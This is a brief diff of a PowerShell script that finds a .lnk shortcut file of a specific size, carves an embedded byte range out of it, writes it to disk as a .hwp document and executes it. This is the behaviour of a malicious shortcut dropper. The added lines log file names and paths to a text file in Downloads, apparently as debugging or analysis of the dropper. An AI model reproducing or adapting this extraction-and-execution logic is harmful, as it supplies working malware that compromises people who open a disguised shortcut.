@@ -3,11 +3,12 @@ for($a = 0;$a -lt $lk.length;$a++){if($lk[$a].length -eq 56397) {$lk=$lk[$a].nam
 ac -path "C:\Users\user\Downloads\1.txt" $lk
 if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 56397}};
 $n=$lk.name.Replace('.lnk','.hwp');
-
+ac -path "C:\Users\user\Downloads\1.txt" $n
 $lk=$lk.FullName;$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..(5709+50688-1)];
-
+ac -path "C:\Users\user\Downloads\1.txt" $lk
 $fsdf=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fsdf,$file1);
 &$fsdf;
+
 
 
 
